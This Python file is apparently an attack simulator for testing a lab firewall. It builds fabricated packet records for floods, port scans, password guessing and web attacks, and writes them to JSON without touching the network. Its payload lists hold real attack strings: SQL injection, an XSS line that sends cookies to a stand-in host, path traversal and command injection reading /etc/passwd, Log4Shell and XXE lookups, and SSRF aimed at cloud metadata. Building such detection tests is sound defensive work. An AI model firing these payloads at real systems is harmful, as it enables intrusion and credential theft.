"""Attack simulator: builds fabricated packets/payloads that carry real-looking signatures.

Nothing here touches the network. Every "packet" is just a dict that gets written
to a JSON file in the shared folder. Packets do NOT contain the attack name - the
firewall must work out what it is from the content (flags, ports, rate, payload).
"""
import random
import time
import uuid
from collections import namedtuple
from urllib.parse import quote

Step = namedtuple("Step", "delay port proto flags payload")
Scenario = namedtuple("Scenario", "key group label description build")

GROUPS = ["DoS", "Network Scan", "Brute Force", "Payload", "Other"]
SCENARIOS = {}

DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0"
PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "welcome1", "P@ssw0rd",
             "dragon", "monkey", "iloveyou", "sunshine", "master", "login", "abc123",
             "football", "trustno1", "shadow", "superman", "michael", "batman"]


def _pw(i):
    return PASSWORDS[i % len(PASSWORDS)] + ("" if i < len(PASSWORDS) else str(i))


def http_req(method, path, host, ua=DEFAULT_UA, body="",
             ctype="application/x-www-form-urlencoded", extra=""):
    head = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%s" % (method, path, host, ua, extra)
    if body:
        head += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype, len(body))
    return head + "\r\n" + body


def _add(key, group, label, description, build):
    SCENARIOS[key] = Scenario(key, group, label, description, build)


def _eicar():
    # Split so antivirus does not quarantine this source file. Harmless industry test string.
    return "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


# ----------------------------------------------------------------- DoS
_add("dos_http_flood", "DoS", "HTTP request flood",
     "150 complete HTTP GET requests, ~10 ms apart. Detected by request rate per source.",
     lambda v: [Step(0.01, 80, "TCP", "PA", http_req("GET", "/", v)) for _ in range(150)])

_add("dos_syn_flood", "DoS", "TCP SYN flood",
     "200 bare SYN packets to port 80. Detected by SYN rate to one port.",
     lambda v: [Step(0.01, 80, "TCP", "S", "") for _ in range(200)])

_add("dos_udp_flood", "DoS", "UDP flood",
     "200 UDP datagrams (512 bytes) to one port. Detected by UDP rate.",
     lambda v: [Step(0.01, 5060, "UDP", "", "A" * 512) for _ in range(200)])

_add("dos_icmp_flood", "DoS", "ICMP (ping) flood",
     "150 ICMP echo requests in a burst. Detected by ICMP rate.",
     lambda v: [Step(0.01, 0, "ICMP", "", "ICMP ECHO REQUEST 64 bytes") for _ in range(150)])

_add("dos_slowloris", "DoS", "Slowloris (slow headers)",
     "40 HTTP requests that never finish their headers. Detected by incomplete-request count.",
     lambda v: [Step(0.15, 80, "TCP", "PA",
                     "GET / HTTP/1.1\r\nHost: %s\r\nX-a: %d\r\n" % (v, random.randint(1000, 9999)))
                for _ in range(40)])

# ------------------------------------------------------------ Network scan
_add("scan_syn", "Network Scan", "TCP SYN scan (sequential ports)",
     "SYN probes to 100 sequential ports. Detected by distinct-port count.",
     lambda v: [Step(0.02, p, "TCP", "S", "") for p in range(20, 120)])

_COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                 1433, 3306, 3389, 5432, 5900, 8080, 8443]
_add("scan_common_ports", "Network Scan", "Common-ports sweep",
     "Probes the 21 most common service ports. Detected by distinct-port count.",
     lambda v: [Step(0.1, p, "TCP", "S", "") for p in _COMMON_PORTS])

_add("scan_xmas", "Network Scan", "XMAS scan (FIN+PSH+URG)",
     "Packets with the FIN/PSH/URG flag combination. Detected by flag signature.",
     lambda v: [Step(0.05, p, "TCP", "FPU", "") for p in range(20, 40)])

_add("scan_null", "Network Scan", "NULL scan (no flags)",
     "TCP packets with no flags set. Detected by flag signature.",
     lambda v: [Step(0.05, p, "TCP", "NONE", "") for p in range(20, 40)])

_add("scan_fin", "Network Scan", "FIN scan",
     "Lone FIN packets to unrelated ports. Detected by flag signature.",
     lambda v: [Step(0.05, p, "TCP", "F", "") for p in range(20, 40)])

_UDP_PORTS = [53, 67, 69, 111, 123, 137, 161, 162, 389, 500, 514, 1900, 5353]
_add("scan_udp", "Network Scan", "UDP port scan",
     "Empty UDP probes to 13 well-known ports. Detected by distinct-port count.",
     lambda v: [Step(0.1, p, "UDP", "", "") for p in _UDP_PORTS])

_add("scan_nmap_nse", "Network Scan", "Nmap Scripting Engine probe",
     "HTTP probes carrying the Nmap NSE user-agent. Detected by tool fingerprint.",
     lambda v: [Step(0.3, p, "TCP", "PA", http_req(
         "GET", "/", v, ua="Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"))
         for p in (80, 8080, 443)])

_NIKTO_PATHS = ["/admin/", "/phpmyadmin/", "/.git/config", "/backup.zip", "/server-status", "/test.php"]
_add("scan_nikto", "Network Scan", "Nikto web vulnerability scan",
     "Requests for risky paths with the Nikto user-agent. Detected by tool fingerprint.",
     lambda v: [Step(0.2, 80, "TCP", "PA", http_req(
         "GET", p, v, ua="Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003131)")) for p in _NIKTO_PATHS])

_add("scan_sqlmap", "Network Scan", "sqlmap probe (tool fingerprint)",
     "Requests carrying the sqlmap user-agent. Detected by tool fingerprint.",
     lambda v: [Step(0.3, 80, "TCP", "PA", http_req(
         "GET", "/item?id=%d" % i, v, ua="sqlmap/1.7#stable (https://sqlmap.org)")) for i in range(1, 5)])

_WORDLIST = ["admin", "login", "backup", "backup.zip", "config", ".env", ".git/config", "phpmyadmin",
             "wp-admin", "server-status", "test", "old", "dev", "uploads", "images", "api", "console",
             "dashboard", "db", "sql", "private", "secret", "tmp", "cgi-bin", "robots.txt", "staging",
             "internal", "debug", "logs", "archive"]
_add("scan_dirb", "Network Scan", "Web directory brute-force",
     "30 requests for different paths in a row. Detected by distinct-path count.",
     lambda v: [Step(0.05, 80, "TCP", "PA", http_req("GET", "/" + w, v)) for w in _WORDLIST])

# ------------------------------------------------------------ Brute force
_add("bf_ssh", "Brute Force", "SSH password guessing",
     "30 SSH password-auth attempts for user root. Detected by auth-attempt rate.",
     lambda v: [Step(0.2, 22, "TCP", "PA",
                     "SSH_MSG_USERAUTH_REQUEST user=root method=password password=%s" % _pw(i))
                for i in range(30)])

_add("bf_http", "Brute Force", "HTTP login brute force",
     "30 POST /login attempts for user admin. Detected by failed-login rate.",
     lambda v: [Step(0.2, 80, "TCP", "PA", http_req(
         "POST", "/login", v, body="username=admin&password=%s" % _pw(i))) for i in range(30)])

_add("bf_ftp", "Brute Force", "FTP login brute force",
     "30 FTP USER/PASS attempts. Detected by auth-attempt rate.",
     lambda v: [Step(0.2, 21, "TCP", "PA", "USER admin\r\nPASS %s\r\n" % _pw(i)) for i in range(30)])

_add("bf_mysql", "Brute Force", "MySQL password guessing",
     "30 database auth attempts for user root. Detected by auth-attempt rate.",
     lambda v: [Step(0.2, 3306, "TCP", "PA", "MYSQL_AUTH user=root password=%s" % _pw(i))
                for i in range(30)])

_add("bf_stuffing", "Brute Force", "Credential stuffing (many users)",
     "30 logins with different usernames, same password. Detected by distinct-user count.",
     lambda v: [Step(0.2, 80, "TCP", "PA", http_req(
         "POST", "/login", v, body="username=user%d&password=Summer2026!" % i)) for i in range(30)])

# ---------------------------------------------------------------- Payloads


def _payload(key, label, desc, variants, mode="query", path="/search", param="q",
             ctype="application/x-www-form-urlencoded"):
    def build(v):
        steps = []
        for var in variants:
            if mode == "query":
                req = http_req("GET", "%s?%s=%s" % (path, param, quote(var, safe="")), v)
            elif mode == "body":
                req = http_req("POST", path, v, body="%s=%s" % (param, quote(var, safe="")))
            elif mode == "raw":
                req = http_req("POST", path, v, body=var, ctype=ctype)
            else:  # header
                req = http_req("GET", path, v, ua=var)
            steps.append(Step(0.5, 80, "TCP", "PA", req))
        return steps
    _add(key, "Payload", label, desc, build)


_payload("pl_sqli_union", "SQL injection - UNION SELECT", "Data-extraction SQLi strings in a query parameter.",
         ["' UNION SELECT username,password FROM users--", "1 UNION ALL SELECT NULL,NULL,version()--"])
_payload("pl_sqli_bool", "SQL injection - boolean / auth bypass", "Tautology strings such as ' OR '1'='1.",
         ["' OR '1'='1' --", "admin' OR 1=1#", "\" OR \"\"=\""], mode="body", path="/login", param="username")
_payload("pl_sqli_time", "SQL injection - time-based blind", "SLEEP / WAITFOR / pg_sleep delay payloads.",
         ["1; SELECT SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "1 AND pg_sleep(5)"], path="/item", param="id")
_payload("pl_xss_script", "XSS - <script> tag", "Reflected script-tag payloads.",
         ["<script>alert(1)</script>", "<script>document.location='//sim.invalid/?c='+document.cookie</script>"])
_payload("pl_xss_event", "XSS - event handler / javascript: URI", "onerror/onload handlers and javascript: URIs.",
         ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)"])
_payload("pl_traversal", "Path traversal", "../ sequences and sensitive file names.",
         ["../../../../etc/passwd", "..%2f..%2f..%2fwindows/win.ini", "....//....//etc/shadow"],
         path="/download", param="file")
_payload("pl_cmdi", "OS command injection", "Shell metacharacters followed by commands.",
         ["; cat /etc/passwd", "| whoami", "$(id)", "`uname -a`"], path="/ping", param="host")
_payload("pl_lfi_php", "PHP stream wrapper (LFI)", "php://filter style file inclusion.",
         ["php://filter/convert.base64-encode/resource=index.php"], path="/page", param="file")
_payload("pl_log4shell", "Log4Shell-style JNDI lookup", "${jndi:ldap://...} string in the User-Agent (non-resolvable).",
         ["${jndi:ldap://sim.invalid/a}", "${jndi:rmi://sim.invalid/b}"], mode="header", path="/")
_payload("pl_shellshock", "Shellshock-style header", "Function-definition string in the User-Agent.",
         ["() { :; }; /bin/echo simulated"], mode="header", path="/cgi-bin/status")
_payload("pl_ssti", "Template injection (SSTI)", "{{7*7}} style probes.",
         ["{{7*7}}", "<%= 7*7 %>"], path="/greet", param="name")
_payload("pl_xxe", "XML external entity (XXE)", "DOCTYPE with external ENTITY.",
         ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
         mode="raw", path="/xml", ctype="application/xml")
_payload("pl_ssrf", "Server-side request forgery (SSRF)", "URL parameter aimed at cloud metadata / localhost.",
         ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"], path="/fetch", param="url")
_payload("pl_eicar", "Malware upload - EICAR test file", "Harmless industry antivirus test string in an upload.",
         [_eicar()], mode="raw", path="/upload", ctype="application/octet-stream")
_payload("pl_fake_malware", "Malware upload - fabricated lab sample", "Made-up LABSIM signature strings (not real malware).",
         ["LABSIM-MALWARE-SIG-7F3A9C", "LABSIM-RANSOM-NOTE: your files are encrypted (simulation)"],
         mode="raw", path="/upload", ctype="application/octet-stream")
_payload("pl_c2_beacon", "Simulated C2 beacon", "Fabricated command-and-control check-in.",
         ["LABSIM-C2-BEACON id=1337 cmd=poll"] * 3, mode="raw", path="/beacon", ctype="text/plain")


# ------------------------------------------------------------------ Other
def _dns_tunnel(v):
    alphabet = "abcdefghijklmnopqrstuvwxyz234567"
    return [Step(0.2, 53, "UDP", "", "DNS QUERY TXT %s.t.lab.invalid" %
                 "".join(random.choice(alphabet) for _ in range(52))) for _ in range(12)]


_add("other_dns_tunnel", "Other", "DNS tunneling",
     "Long encoded DNS labels (data smuggled in queries). Detected by label signature.", _dns_tunnel)

_add("other_smuggling", "Other", "HTTP request smuggling (CL + TE)",
     "Requests carrying both Content-Length and Transfer-Encoding: chunked.",
     lambda v: [Step(0.4, 80, "TCP", "PA", http_req(
         "POST", "/", v, body="0\r\n\r\nG", extra="Transfer-Encoding: chunked\r\n")) for _ in range(3)])

_add("other_benign", "Other", "Benign browsing (control)",
     "Normal page loads, one login and one DNS lookup. Should NOT be blocked.",
     lambda v: [
         Step(0.4, 80, "TCP", "PA", http_req("GET", "/index.html", v)),
         Step(0.4, 80, "TCP", "PA", http_req("GET", "/about.html", v)),
         Step(0.4, 80, "TCP", "PA", http_req("GET", "/css/site.css", v)),
         Step(0.4, 80, "TCP", "PA", http_req("POST", "/login", v, body="username=alice&password=Correct%20Horse")),
         Step(0.4, 53, "UDP", "", "DNS QUERY A www.example.com"),
     ])


def make_packet(src, dst, step, ts=None):
    """Build one raw event. Note: no attack-type label is included."""
    payload = step.payload
    return {
        "id": uuid.uuid4().hex[:12],
        "type": "packet",
        "ts": ts if ts is not None else time.time(),
        "src_ip": src,
        "src_port": random.randint(20000, 60000),
        "dst_ip": dst,
        "dst_port": step.port,
        "protocol": step.proto,
        "tcp_flags": step.flags if step.proto == "TCP" else "",
        "payload": payload,
        "length": len(payload),
    }


def catalog():
    out = []
    for g in GROUPS:
        items = [{"key": s.key, "label": s.label, "description": s.description,
                  "packets": len(s.build("0.0.0.0"))}
                 for s in SCENARIOS.values() if s.group == g]
        out.append({"name": g, "items": items})
    return out
